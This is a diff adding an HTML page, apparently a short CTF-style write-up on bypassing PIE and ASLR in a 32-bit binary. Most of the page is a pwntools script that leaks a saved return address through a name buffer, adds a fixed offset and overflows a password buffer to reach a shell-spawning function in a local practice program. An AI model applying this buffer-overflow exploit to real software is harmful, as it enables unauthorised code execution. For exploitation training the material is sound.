@@ -1,0 +1,143 @@
+<html>
+ <head>
+<title> PIE enabled  </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 130px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 200px; font-weight: bold; color: #fff;">
+ <h2 style="color:white;font-size:1.8em;">ASLR combo with pie </h2>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Bypassing Pie enabled binary !! </h1>
+   
+ <br> 
+
+<p> OK this was my first encounter with pie enabled binary so  the Exploit goes like this... <br>
+    <br>
+      a)  finding name_offset = eip's address - name_buffer address && the same way pass_offset
+      b)  finding bin_offset= saved eip's value (not the address) - give_shell address
+
+    <b> 1. Leak the address of the stack </b> eventually leaking the saved eip address <br>
+    <b> 2. Calculate the offset between the eip and req address here it was func() which spawns a shell <br>
+    <b> 3. Now overflow the pass_buffer with leaked eip address+offset   </p>
+  
+
+<br>
+
+<code> 
+from pwn import *
+context.bits=32
+
+name_offset=112
+
+pass_offset=212
+
+                                #saved-eip=0xf7e1272e
+bin_offset=2015403              # 2710294403  #1584672893 #2002347
+
+p=process('aslr')
+
+
+
+msg=p.recvuntil('?\n')
+print msg
+
+print "[+] sending name length"
+
+p.sendline("116")
+
+print 116
+
+msg=p.recvuntil('?\n')
+print "["+msg+"]"
+
+print "[+] sending name"
+
+payload="A"*name_offset
+
+p.sendline(payload)
+
+print p.recvuntil("Hello, ")
+print p.recv(112)
+a=p.recvline().strip("\n")
+print "["+a+"]"
+
+context.bits=len(a)*8
+a=unpack(a)
+
+print "[+] Leaked adress"
+
+print hex(a)
+
+a+=bin_offset
+
+print "[+] Target adress"
+
+print hex(a)
+
+print "[+] Sending final payload"
+
+payloads="A"*pass_offset+pack(a)
+
+p.sendline(payloads)
+
+p.interactive()
+ </code>
+
+</body>
+</html>
